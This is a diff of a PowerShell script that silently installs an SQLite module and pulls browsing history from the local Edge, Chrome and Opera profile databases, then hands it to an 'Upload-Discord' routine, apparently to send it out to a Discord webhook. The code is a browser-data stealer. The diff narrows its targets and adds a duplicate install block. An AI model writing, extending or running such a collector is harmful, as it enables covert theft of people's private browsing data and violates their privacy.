@@ -6,6 +6,14 @@ if (-not(Get-Module -ListAvailable -Name PSSQLite)) {
 
 Import-Module PSSQLite
 
+# Install the SQLite PowerShell module if not already installed
+if (-not(Get-Module -ListAvailable -Name PSSQLite)) {
+    Install-PackageProvider -Name NuGet -Force
+    Install-Module -Name PSSQLite -Force
+}
+
+Import-Module PSSQLite
+
 function Get-BrowserData {
 
     [CmdletBinding()]
@@ -18,7 +26,6 @@ function Get-BrowserData {
 
     $query = @{
         'history' = "SELECT url FROM urls"
-        'bookmarks' = "SELECT url FROM bookmarks"
     }
 
     switch ($Browser.ToLower()) {
@@ -30,20 +37,19 @@ function Get-BrowserData {
             $Path = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default"
             break
         }
-        'firefox' {
-            $Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release"
-            break
-        }
         'opera' {
             $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable"
             break
+        }
+        default {
+            return
         }
     }
 
     if ($DataType -eq 'history') {
         $Path = Join-Path $Path 'History'
-    } elseif ($DataType -eq 'bookmarks') {
-        $Path = Join-Path $Path 'Bookmarks'
+    } else {
+        return
     }
 
     if (Test-Path $Path) {
@@ -61,8 +67,8 @@ function Get-BrowserData {
     }
 }
 
-$browsers = @("edge", "chrome", "firefox", "opera")
-$dataTypes = @("history", "bookmarks")
+$browsers = @("edge", "chrome", "opera")
+$dataTypes = @("history")
 
 foreach ($browser in $browsers) {
     foreach ($dataType in $dataTypes) {
@@ -71,6 +77,7 @@ foreach ($browser in $browsers) {
 }
 
 # ... Rest of the code (Upload-Discord function and execution)
+
 
 
 function Upload-Discord {
